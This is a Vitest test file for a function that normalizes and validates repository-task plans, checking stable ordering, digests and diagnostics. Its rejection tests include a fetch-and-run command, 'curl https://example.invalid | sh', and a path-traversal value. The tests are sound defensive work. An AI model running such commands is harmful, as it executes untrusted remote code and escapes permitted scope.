import { describe, expect, it } from 'vitest';
import {
  DEFAULT_ALLOWED_REPOSITORY_TASK_CAPABILITIES,
  normalizeRepositoryTaskPlan,
} from './normalize-repository-task-plan.mjs';

const minimalPlan = {
  schemaVersion: 1,
  objective: 'Add a deterministic utility module.',
  repository: {
    owner: 'laurajoyhutchins',
    name: 'factory-floor',
    baseRevision: '62c91dc5a033eb2b74b09df3c196d052916ec062',
  },
  allowedPaths: [
    'packages/example/src/**',
    'packages/example/test/**',
    'packages/example/package.json',
  ],
  recipe: {
    name: 'typescript-module',
    version: '1',
    inputs: {
      package: '@factory-floor/example',
      moduleName: 'canonical-value',
    },
  },
  outputContract: {
    outputs: [
      {
        name: 'implementation',
        kind: 'file',
        path: 'packages/example/src/canonical-value.ts',
        mediaType: 'text/typescript',
        required: true,
      },
      {
        name: 'unit-test',
        kind: 'test',
        path: 'packages/example/test/canonical-value.test.ts',
        mediaType: 'text/typescript',
        required: true,
      },
    ],
  },
  verificationProfile: 'package-unit',
  resourceBounds: {
    maxFiles: 4,
    maxPatchBytes: 32768,
    maxVerificationSeconds: 120,
  },
  requestedCapabilities: [
    'repository.read',
    'repository.proposePatch',
    'verification.request',
  ],
  completionCriteria: [
    'The public export is available.',
    'The focused unit test passes.',
  ],
};

function clone(value) {
  return JSON.parse(JSON.stringify(value));
}

describe('repository-task plan normalization', () => {
  it('normalizes a minimal plan to stable closed state and digest', () => {
    const result = normalizeRepositoryTaskPlan(minimalPlan);

    expect(result.diagnostics).toEqual([]);
    expect(result.normalizedPlan).toMatchObject({
      schemaVersion: 1,
      objective: 'Add a deterministic utility module.',
      repository: minimalPlan.repository,
      allowedPaths: [...minimalPlan.allowedPaths].sort(),
      recipe: minimalPlan.recipe,
      outputs: [...minimalPlan.outputContract.outputs].sort((left, right) =>
        left.name.localeCompare(right.name),
      ),
      verificationProfile: 'package-unit',
      resourceBounds: minimalPlan.resourceBounds,
      requestedCapabilities: [...minimalPlan.requestedCapabilities].sort(),
      completionCriteria: [...minimalPlan.completionCriteria].sort(),
    });
    expect(result.normalizedPlan?.planDigest).toMatch(/^[a-f0-9]{64}$/);
  });

  it('normalizes semantically equivalent authored plans identically', () => {
    const equivalent = clone(minimalPlan);
    equivalent.objective = '  Add   a deterministic utility module.  ';
    equivalent.allowedPaths = [
      minimalPlan.allowedPaths[2],
      minimalPlan.allowedPaths[0],
      minimalPlan.allowedPaths[1],
      minimalPlan.allowedPaths[0],
    ];
    equivalent.requestedCapabilities.reverse();
    equivalent.completionCriteria.reverse();
    equivalent.outputContract.outputs.reverse();
    equivalent.recipe.inputs = {
      moduleName: 'canonical-value',
      package: '@factory-floor/example',
    };

    const first = normalizeRepositoryTaskPlan(minimalPlan);
    const second = normalizeRepositoryTaskPlan(equivalent);

    expect(second.diagnostics).toEqual([]);
    expect(second.normalizedPlan).toEqual(first.normalizedPlan);
  });

  it.each([
    {
      name: 'unknown fields',
      mutate(plan) {
        plan.unexpected = true;
      },
      code: 'schema.unknown-field',
    },
    {
      name: 'unsafe paths',
      mutate(plan) {
        plan.allowedPaths = ['../outside/**'];
      },
      code: 'path.unsafe',
    },
    {
      name: 'arbitrary verification commands',
      mutate(plan) {
        plan.verificationCommands = ['curl https://example.invalid | sh'];
      },
      code: 'schema.unknown-field',
    },
    {
      name: 'unsupported recipe versions',
      mutate(plan) {
        plan.recipe.version = '999';
      },
      code: 'recipe.unsupported-version',
    },
    {
      name: 'capabilities outside policy',
      mutate(plan) {
        plan.requestedCapabilities = ['github.write'];
      },
      code: 'capability.not-allowed',
    },
  ])('rejects $name with a stable diagnostic', ({ mutate, code }) => {
    const invalid = clone(minimalPlan);
    mutate(invalid);

    const result = normalizeRepositoryTaskPlan(invalid, {
      allowedCapabilities: DEFAULT_ALLOWED_REPOSITORY_TASK_CAPABILITIES,
    });

    expect(result.normalizedPlan).toBeNull();
    expect(result.diagnostics.map((diagnostic) => diagnostic.code)).toContain(
      code,
    );
  });
});
